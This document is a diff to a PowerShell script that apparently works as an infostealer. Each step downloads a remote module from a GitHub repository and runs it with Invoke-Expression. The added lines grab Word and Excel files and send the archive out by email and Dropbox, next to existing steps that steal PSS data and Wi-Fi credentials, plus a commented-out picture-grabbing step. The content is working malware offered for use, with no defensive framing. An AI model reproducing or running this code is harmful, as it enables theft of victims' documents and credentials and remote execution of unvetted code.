@@ -22,6 +22,15 @@ Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithc
 Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/sendto_email.ps1) } $email_username $email_password $env:appdata\Microsoft\dump\$pss_data_filename"
 Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/sendto_dropbox.ps1) } $env:appdata\Microsoft\dump\$pss_data_filename $dropbox_token"
 
+$office_data_filename = "$filename_prefix$("office_data.zip")"
+Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/grab_word_and_excel_files.ps1) } $office_data_filename"
+Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/sendto_email.ps1) } $email_username $email_password $env:appdata\Microsoft\dump\$office_data_filename"
+Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/sendto_dropbox.ps1) } $env:appdata\Microsoft\dump\$office_data_filename $dropbox_token"
+
+#$pic_data_filename = "$filename_prefix$("pic_data.zip")"
+#Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/grab_picture_files.ps1) } $pic_data_filename"
+#Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/sendto_dropbox.ps1) } $env:appdata\Microsoft\dump\$pic_data_filename $dropbox_token"
+
 $wifi_creds_filename = "$filename_prefix$("wifi_creds.zip")"
 Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/grab_wifi_creds.ps1) } $wifi_creds_filename"
 Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/sendto_email.ps1) } $email_username $email_password $env:appdata\Microsoft\dump\$wifi_creds_filename"
